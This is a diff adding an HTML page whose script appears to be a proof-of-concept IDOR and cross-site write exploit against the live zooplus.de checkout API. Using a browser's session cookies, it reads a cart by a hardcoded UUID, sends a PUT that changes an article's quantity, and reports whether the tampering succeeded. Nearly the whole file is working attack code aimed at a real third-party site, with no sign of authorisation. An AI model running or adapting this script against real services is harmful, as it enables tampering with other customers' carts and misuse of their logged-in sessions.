@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IDOR Cart Write Test</title>
+</head>
+<body>
+    <h1>Testing IDOR Cart Write with PUT method</h1>
+    <div id="output"></div>
+    <script>
+        const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
+        const output = document.getElementById('output');
+        
+        function log(msg) {
+            console.log(msg);
+            output.innerHTML += '<div>' + msg + '</div>';
+        }
+        
+        log("[*] Starting test with PUT method...");
+        
+        fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
+            credentials: 'include'
+        })
+        .then(r => r.json())
+        .then(cart => {
+            window.beforeCount = cart.articles.length;
+            window.beforeTotal = cart.summary.grandTotal;
+            const articleId = cart.articles[0]?.id;
+            log(`[+] Cart before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
+            log(`[+] Article ID: ${articleId}`);
+            
+            // Тест с PUT методом
+            return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
+                method: "PUT",
+                credentials: "include",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify({
+                    articleId: articleId,
+                    quantity: 2
+                })
+            });
+        })
+        .then(async r => {
+            const status = r.status;
+            const contentType = r.headers.get("content-type") || "";
+            const text = await r.text();
+            
+            log(`[+] Response: HTTP ${status}, Content-Type: ${contentType}`);
+            
+            if (contentType.includes("application/json")) {
+                try {
+                    const json = JSON.parse(text);
+                    log(`[!!!] SUCCESS! JSON response: ${JSON.stringify(json).substring(0, 200)}`);
+                } catch (e) {
+                    log(`[!] Response: ${text.substring(0, 200)}`);
+                }
+            } else {
+                log(`[!] Response (HTML?): ${text.substring(0, 200)}`);
+            }
+            
+            // Проверить корзину
+            return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
+                credentials: 'include'
+            });
+        })
+        .then(r => r.json())
+        .then(cart => {
+            const afterCount = cart.articles.length;
+            const afterTotal = cart.summary.grandTotal;
+            log(`[+] Cart after: ${afterCount} items, ${afterTotal} EUR`);
+            
+            if (afterCount !== window.beforeCount || Math.abs(afterTotal - window.beforeTotal) > 0.01) {
+                log("\n[!!!] ========================================");
+                log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
+                log("[!!!] ========================================");
+                log(`[!!!] Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
+                log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
+            } else {
+                log("[!] Cart unchanged");
+            }
+        })
+        .catch(e => log(`[!] Error: ${e.message}`));
+    </script>
+</body>
+</html>
+
